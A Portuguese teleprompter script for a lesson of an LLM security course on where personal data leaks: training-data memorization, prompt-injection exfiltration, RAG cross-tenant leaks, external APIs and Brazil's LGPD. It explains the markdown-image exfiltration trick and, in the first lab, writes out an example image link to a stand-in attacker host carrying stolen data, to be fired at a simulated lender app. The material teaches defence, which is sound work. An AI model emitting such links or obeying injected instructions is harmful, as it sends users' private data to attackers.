# Aula 4 — Roteiro falado (teleprompter)

> **Voz calibrada no padrão da Aula 1** (`aula1_roteiro_falado.md`, com base na fala real do professor) — conectores dominantes: "então", "falando sobre X, né?" e "nós" (mais que "vocês") nas partes teóricas; "vocês" na instrução direta da prática. Mantém o "Bora lá?" no fecho da capa; evita anunciar o próximo slide.

**Como usar:**
- **Grave slide a slide** (~40–60s cada).
- **`[pausa]` = respire.** Silêncio é editável.
- **Internalize o exemplo, não as palavras.**
- **Travou? Recomece a frase** — corta na edição.

---

## VÍDEO 1 · Abertura — para onde os dados vazam · ~5 min

**Slide — Capa (Aula 4)**
> Olá. Bem-vindos à quarta aula do curso de LLM Security. Na Aula 3, vimos que cada arquitetura acende uma camada nova de risco, e que a superfície de ataque é a pilha inteira. Hoje a pergunta central é outra: para onde vão os dados pessoais quando eles entram num sistema de LLM? [pausa] É uma pergunta de consciência técnica, não de pânico. E ela puxa uma distinção que sustenta a aula inteira: o dado vaza por dois canais diferentes — pelos pesos, que é o que o modelo aprendeu no treino, e pelo contexto vivo, que é o que está acontecendo agora, na conversa. Bora lá?

**Slide — O que veremos nesta aula**
> Falando sobre o que vamos ver hoje, né? Vamos começar pelo coração da aula: memorização e exfiltração, os dois canais de vazamento. Depois vamos falar de RAG e de APIs externas — dados que saem da sua mão, para um índice ou para um provedor terceiro. Vamos passar pela LGPD — a Lei Geral de Proteção de Dados — e o que ela exige de quem usa LLM. E fechamos com um checklist: como avaliar a política de dados de qualquer provedor antes de adotar.

---

## VÍDEO 2 · Memorização de dados de treino · ~10 min

**Slide — Memorização — o modelo decora o treino**
> Vamos falar agora do primeiro canal: a memorização. E o mecanismo é simples de entender. No pré-treino, o modelo processa bilhões de tokens, e decora, literalmente, trechos que são raros ou muito repetidos no corpus. [pausa] Repara que esse é exatamente o perfil de um dado sensível: um CPF é único, uma chave de API segue um padrão bem definido — então eles se destacam no meio do texto comum, e o modelo tende a memorizar isso quase palavra por palavra. Isso não é um bug, é consequência estatística de treinar em escala. A consequência de segurança é direta: esse modelo pode cuspir esse dado decorado para qualquer usuário, depois, numa conversa qualquer — é a raiz do LLM02, o vazamento de informação sensível. E isso não é hipotético: o training data extraction já demonstrou isso, extraindo telefone e endereço de pessoas reais de modelos que estavam em produção.

**Slide — Memorização — o ataque de extração que provou o risco**
> Vamos falar do caso que tirou isso da hipótese e colocou na literatura, né? Em 2020 e 2021, Carlini e colegas publicaram o trabalho "Extracting Training Data from Large Language Models", atacando o GPT-2. [pausa] Eles geraram cerca de 200 mil textos com o próprio modelo e usaram sinais estatísticos de memorização — perplexidade, comparação entre modelos — para separar o que era só estilo aprendido do que era cópia literal do corpus. O resultado: confirmaram manualmente 604 sequências realmente decoradas, e entre elas tinha nome, telefone, e-mail e endereço físico de pessoas reais que apareciam raramente no treino. Repara num ponto central: ninguém pediu por aquela pessoa específica — foi uma extração genérica que, mesmo assim, expôs PII real. E a lição prática é clara: auditar antes de publicar, rodando esse mesmo tipo de teste — extraction e membership inference — contra o próprio modelo, e fazendo um dedupe agressivo do corpus antes do treino.

**Slide — Memorização — difícil de apagar**
> E aqui mora um problema difícil de resolver, né? Uma vez que o modelo decorou aquele dado, apagar isso não é simples. A LGPD garante ao titular o direito de exclusão, no artigo 18. Mas apagar um dado que está memorizado dentro dos pesos do modelo exigiria, na prática, um retreino completo — e isso é inviável na grande maioria dos casos. [pausa] Existem mitigações, mas nenhuma delas é perfeita. No pré-treino, dá para fazer dedupe do corpus e scrubbing de PII — ou seja, remover duplicatas e limpar dado de identificação pessoal antes de treinar. Depois do treino, um filtro de saída consegue detectar padrão de PII antes de responder. E existe também o differential privacy, que insere ruído no treino justamente para reduzir essa memorização. O problema é real, e as defesas são parciais — não inexistentes, mas parciais.

---

## VÍDEO 3 · Exfiltração via interação · ~10 min

**Slide — Exfiltração via interação — pelo contexto vivo**
> Vamos mudar de canal agora. Aqui, o dado sensível não foi memorizado — ele está presente agora, no contexto vivo da sessão: no system prompt, no documento que o RAG trouxe, ou na saída de uma ferramenta. [pausa] E o mecanismo é o seguinte: uma injeção — um LLM01 — manipula o modelo para revelar esse dado que está ali no contexto, o que caracteriza um LLM02. É a combinação dos dois. Existe um nome preciso para isso em segurança de sistemas: confused deputy. Um agente que tem privilégio — no nosso caso, o modelo, que enxerga o dado — é enganado para agir em favor de alguém que não tinha esse privilégio. O modelo não vaza sozinho; ele é convencido a entregar o que só deveria mostrar para outra pessoa.

**Slide — Exfiltração — o truque da imagem-markdown**
> E agora chega o exemplo mais visual da aula — vale ir devagar aqui. O atacante injeta uma instrução dentro de um conteúdo que o modelo processa. Essa instrução manda o modelo colocar, na resposta, uma imagem em markdown, com uma URL que pertence ao atacante. [pausa] O frontend renderiza essa resposta normalmente, e o navegador, para desenhar a imagem, faz um GET para aquela URL — carregando o segredo dentro da própria query string do endereço. O servidor do atacante só precisa registrar essa requisição e coletar o dado. E o usuário não vê nada de estranho na tela. A defesa, em ordem de eficácia: primeiro, um filtro de egress, que barra ou audita URL externa antes dela sair; depois, expor menos dado no contexto; depois, menor privilégio; e monitoramento por cima de tudo isso. Não existe uma defesa única aqui — são camadas.

---

## VÍDEO 4 · Privacidade em RAG · ~10 min

**Slide — Privacidade em RAG — vazamento entre tenants**
> Então, mudando de bloco: privacidade em RAG. E o exemplo aqui é bem direto. Imaginem um bot de RH: o funcionário A pergunta sobre os benefícios da empresa, e a resposta vem junto com o salário do funcionário B. [pausa] Isso acontece porque o vector store recupera documento por similaridade semântica, sem checar se quem perguntou tem permissão para ver aquele documento — é um erro de design bem comum. Isso combina o LLM02, a divulgação indevida, com um problema clássico de controle de acesso. E tem um segundo ponto: a própria base vetorial concentra PII dentro dos embeddings. Existe uma técnica chamada inversão de embedding, que reconstrói boa parte do texto original a partir do vetor. Ou seja, armazenar como vetor não é o mesmo que anonimizar.

**Slide — Privacidade em RAG — o bot de RH que misturou dois funcionários**
> Vamos tornar esse cenário mais palpável, bem devagar. O funcionário A pergunta ao bot de RH como funciona o reembolso do plano de saúde. [pausa] O vector store busca por similaridade semântica e traz, entre os trechos mais próximos, um pedaço da planilha de remuneração que também cita a palavra "reembolso" — só que esse trecho é o registro do funcionário B. O modelo monta a resposta citando o trecho recuperado, e acaba expondo, sem nenhuma intenção maliciosa de ninguém, o salário do funcionário B para o funcionário A. E a causa raiz é sempre a mesma: o índice recupera por proximidade de texto, não por permissão — similaridade semântica não é controle de acesso. Guardem essa mensagem, porque ela volta no próximo slide: o filtro tinha que estar antes da busca, não depois.

**Slide — Privacidade em RAG — filtrar antes de recuperar**
> A defesa, aqui, mora numa palavra: antes. O filtro de permissão precisa acontecer na hora da consulta ao índice — não depois. [pausa] Se vocês filtram depois, com um reranking por permissão, por exemplo, o dado já foi recuperado e já passou pelo modelo — o vazamento já aconteceu internamente, mesmo que a resposta final seja bloqueada. A defesa correta é nem recuperar o que aquele usuário não pode ver. E complementa com o básico: minimizar PII na base, fazer scrubbing no momento de indexar, e auditar quem acessou o quê.

---

## VÍDEO 5 · Dados enviados a APIs externas · ~10 min

**Slide — Dados enviados a APIs externas — saem da fronteira**
> Agora entra um risco diferente: dado que sai da sua própria fronteira. Quando vocês usam a API de um provedor — OpenAI, Anthropic, Google — o prompt, que pode ter PII dentro dele, sai da infraestrutura de vocês e vai para a infraestrutura do provedor. [pausa] Esse provedor pode logar, reter ou até treinar em cima disso, dependendo do plano e dos termos que ele oferece. E a maioria processa nos Estados Unidos, o que aciona a transferência internacional de dado, que a LGPD regula. Não é para demonizar o provedor aqui — o risco é gerenciável, desde que vocês façam as escolhas certas. Um caso real e conhecido: em 2023, funcionários da Samsung colaram código-fonte confidencial dentro do ChatGPT, na versão consumer. Esse dado foi para os servidores do provedor, e a empresa acabou proibindo IA generativa internamente. É o caso-escola de shadow AI — não foi malícia de ninguém, foi falta de política.

**Slide — APIs externas — o caso Samsung, passo a passo**
> Vamos voltar ao caso da Samsung, agora devagar, porque é o mais citado de vazamento por API externa. [pausa] Em abril de 2023, um engenheiro da Samsung Semiconductor colou no ChatGPT consumer um trecho de código-fonte proprietário, pedindo ajuda pra corrigir um bug. Em poucas semanas, outros funcionários repetiram o gesto — pelo menos três incidentes registrados, incluindo atas de reunião confidenciais. Todo esse conteúdo colado saiu da infraestrutura da Samsung e foi parar nos servidores do provedor, sujeito aos termos do plano consumer: retenção e possível uso em treino, sem nenhum contrato específico protegendo a empresa. A resposta veio depois do fato — a Samsung proibiu temporariamente ferramentas de IA generativa e passou a investir em alternativas internas. [pausa] Repara que não foi um ataque: foi um funcionário tentando ser produtivo, sem política nenhuma orientando o que podia ou não ser colado ali — é o que chamamos de shadow AI. E a lição é direta: a defesa não pode ser confiar no bom senso de cada um; tem que ser política e DLP, antes que aconteça, não depois.

**Slide — APIs externas — defesa em camadas**
> E a defesa aqui vem em camadas, escalando conforme a sensibilidade do dado. A primeira camada: minimizar — não colocar no prompt o que não é necessário — e anonimizar ou redigir a PII antes de enviar. [pausa] Depois, o plano enterprise: a maioria dos grandes provedores oferece, por contrato, a opção de não treinar com os dados de vocês e reter por um tempo mínimo, ou zero. Mais uma camada: uma ferramenta de DLP, que intercepta o prompt antes dele sair e barra dado sensível. Some a isso política e treinamento dos funcionários, porque o caso Samsung mostrou que o risco vem do time tentando ser produtivo. E, para dado muito sensível, existe a opção self-hosted, que elimina de vez a exfiltração para fora da empresa. Não existe bala de prata aqui — é uma escada de camadas.

---

## VÍDEO 6 · LGPD e IA · ~11 min

**Slide — LGPD e IA — base legal e minimização**
> Vamos voltar para a LGPD, agora com mais profundidade. Ela exige uma base legal para qualquer tratamento de dado pessoal — e mandar um dado para um LLM é, por definição, um tratamento. [pausa] Nas empresas, as bases mais comuns são o consentimento e o legítimo interesse, e as duas precisam estar documentadas, não só presumidas. E a minimização, aqui, é bem direta: se a tarefa é responder sobre o contrato do cliente X, o prompt não precisa levar o histórico financeiro dele, o endereço, o CPF, a renda — leva só o que é necessário para aquela tarefa. Então não joguem o registro inteiro no prompt. Isso não é só boa prática — é obrigação legal.

**Slide — LGPD — a ficha inteira que não precisava sair**
> Vamos ancorar isso num cenário parecido com o da CredSim, que vocês vão ver na prática. A tarefa é simples: gerar um resumo de boas-vindas pro cliente que acabou de contratar um empréstimo. [pausa] E o time monta o prompt colando o registro inteiro do CRM — nome, CPF, endereço, renda declarada, histórico de crédito e o score. Só que, pra essa tarefa, só o nome e o produto contratado eram realmente necessários; todo o resto é dado pessoal exposto ao provedor sem finalidade e sem base legal para aquele uso específico — porque a base legal que justifica o cadastro no CRM não cobre, automaticamente, mandar tudo isso pra um LLM terceiro. E a correção aqui não é jurídica, é de engenharia: definir, por tarefa, os campos mínimos necessários antes de montar o prompt — não decidir campo a campo, na hora, sob pressão.

**Slide — LGPD e IA — direitos, transferência e o que vem**
> Falando sobre os direitos do titular, né? O artigo 18 garante acesso, correção e exclusão. E aqui a gente retoma a tensão do início da aula: se o dado foi memorizado dentro dos pesos do modelo, como cumprir um pedido de exclusão? [pausa] Não existe uma resposta técnica perfeita hoje — existem mitigações, e um debate regulatório ainda em aberto. Vale ser honesto sobre isso. Tem também a transferência internacional: mandar dado para um provedor nos Estados Unidos exige um mecanismo adequado, previsto no capítulo quinto da LGPD. Para operação de maior risco — e usar um LLM externo com PII de cliente se encaixa nisso — o caminho é documentar com um RIPD, o Relatório de Impacto à Proteção de Dados. E, por fim, o Brasil ainda discute o PL 2338, o projeto do Marco Legal da IA, inspirado no AI Act europeu — ainda em tramitação, mas que pode redefinir as regras para IA de alto risco. O quadro legal está em movimento; acompanhem.

---

## VÍDEO 7 · Avaliando a política do provedor · ~8 min

**Slide — Avaliando o provedor — as três perguntas**
> Chegou a hora de avaliar um provedor de verdade — e isso vira uma espécie de due diligence, em três perguntas. [pausa] A primeira: ele treina com o meu dado? Na versão consumer gratuita, o padrão geralmente é treinar; na API ou no plano enterprise, o padrão costuma ser o oposto, por contrato — e a pergunta certa é: dá para desligar isso? A segunda pergunta é sobre retenção: por quanto tempo ele guarda prompt e resposta? Existe retenção zero? E quem são os subprocessadores — porque cada um deles é mais um ponto de risco. A terceira é região e controles: onde o dado é processado e armazenado, o que importa bastante para a LGPD e para setores regulados? Dá para escolher a região, e dá para desligar o logging? Pensem nisso como um formulário de avaliação de fornecedor.

**Slide — Avaliando o provedor — a regra de ouro**
> E aqui fecha esse bloco com a regra mais importante da aula. Para processar dado corporativo ou dado pessoal, a versão consumer gratuita de qualquer provedor está fora de cogitação. [pausa] Os termos da versão gratuita são escritos pensando em uso pessoal, e frequentemente ela treina por padrão. E tem outro detalhe: os termos mudam. Uma política que hoje diz "sem treino" pode mudar amanhã. Então leiam sempre os termos na versão atual, direto na fonte — não confiem em resumo de terceiro.

---

## VÍDEO 8 · Conclusão — dois canais e duas camadas · ~6 min

**Slide — Conclusão — dois canais e duas camadas**
> Vamos amarrar a aula. Nós vimos dois canais de vazamento, com problemas e defesas diferentes: a memorização acontece no treino, e é difícil de desfazer; a exfiltração acontece em tempo real, na conversa, e é contida com controle de acesso e filtro de egress. Se vocês guardarem uma coisa só desta aula, que seja essa distinção. [pausa] Vimos também duas camadas que precisam estar alinhadas: a LGPD define o que vocês podem fazer — e vocês continuam responsáveis, mesmo processando num LLM de terceiro; a política do provedor define o que acontece com o dado quando ele sai da sua infraestrutura. As duas camadas precisam conversar entre si. E o princípio mais barato e mais eficaz de todos, que atravessa a aula inteira: minimizar. Dado que não entra no prompt não é memorizado, não é exfiltrado, não vai para terceiro. Na Aula 5, vamos aprofundar as mitigações e os controles — as ferramentas concretas para aplicar tudo isso.

---

## VÍDEO 9 · Prática 1 — Exfiltração via interação na CredSim · ~9 min

**Slide — Prática 1 — Exfiltração via interação na CredSim**
> Vamos para a prática. Aqui a CredSim simula uma financeira, com CPF, nome e renda de tomador de empréstimo — e o objetivo é provar, na mão, o vazamento pelo contexto vivo que vimos na teoria. [pausa] Com a defesa desligada, disparem a injeção que faz o assistente revelar o dado de outro cliente — isso já é o LLM01 combinado com o LLM02 — e reparem que a resposta vem com aquela imagem em markdown, algo como `![](http://atacante/log?dados=...)`. Depois disso, liguem o filtro de egress e repitam o mesmo ataque, comparando o que aparece no log.

**Slide — Exfiltração — o que observar**
> E o que vocês observam aqui? Primeiro, que o ataque é silencioso — o segredo sai escondido na URL daquela "imagem", sem nenhum alerta visível para o usuário; só o log de egress mostra a requisição saindo para o domínio externo. Segundo, que com o filtro de egress ligado, essa URL externa é barrada antes de chegar ao frontend, e o dado simplesmente não sai. A diferença entre os dois logs é a prova de que a defesa funciona.

---

## VÍDEO 10 · Prática 2 — RAG multi-tenant na CredSim · ~9 min

**Slide — Prática 2 — RAG multi-tenant na CredSim**
> Segunda prática: agora é o vazamento entre tenants. Rodem duas instâncias da CredSim, representando duas financeiras diferentes — dois tenants distintos. [pausa] Consultem a partir de um dos tenants, e reparem que o RAG retorna também um documento que pertence ao outro tenant — é o mesmo cenário do "salário de outro" que vimos na teoria, só que agora na tela de vocês. Depois, liguem o filtro de permissão por tenant na consulta e repitam.

**Slide — RAG multi-tenant — o que observar**
> E o que se observa? Sem isolamento, a consulta do tenant A vem acompanhada de um documento do tenant B — isso é LLM02 mais LLM08, as fraquezas de vetores e embeddings que vocês viram na Aula 2. Já com o filtro de permissão aplicado na consulta, antes da recuperação, o documento do outro tenant nem chega a ser recuperado — a diferença aparece direto na lista de documentos que o RAG traz de volta.

---

## VÍDEO 11 · Prática 3 — Dados a terceiros e checklist LGPD · ~8 min

**Slide — Prática 3 — Dados a terceiros e checklist LGPD**
> Terceira e última prática: agora vamos rastrear o dado que sai da CredSim para fora — para APIs de fornecedor, para e-mail. [pausa] Observem o payload que é enviado nessas chamadas: qual dado viaja, o que fica logado. Depois, apliquem o mini-checklist de LGPD na própria CredSim: existe base legal para tratar o CPF daquele cliente? A finalidade está documentada? O dado está minimizado, ou está indo inteiro? E como vocês atenderiam um pedido de exclusão? A ideia não é deixar a CredSim conforme — é treinar o raciocínio de avaliação.

**Slide — Terceiros e LGPD — o que observar**
> E o que fica dessa última prática? Primeiro, tornar o fluxo de dado visível: o que sai, para quem vai, o que é logado — e isso já aciona transferência internacional e prazo de retenção, os dois pontos que vimos na teoria. Segundo, o checklist não resolve o problema sozinho — ele treina o raciocínio de conformidade. A mitigação a fundo, com filtro de saída, isolamento por tenant e DLP, é o que vem na Aula 5.
